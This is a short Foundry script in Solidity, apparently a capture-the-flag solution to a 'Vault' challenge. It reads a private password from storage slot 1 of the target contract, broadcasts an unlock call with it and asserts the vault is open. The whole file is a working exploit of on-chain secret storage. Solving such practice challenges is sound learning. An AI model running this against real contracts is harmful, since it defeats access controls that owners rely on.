// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "forge-std/Script.sol";
import "src/vault/Vault.sol";


contract VaultScript is Script {
    function bonk(address eoa, Vault target) public {
        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
        vm.broadcast(eoa);
        target.unlock(password);
        assert(!target.locked());
    }
}
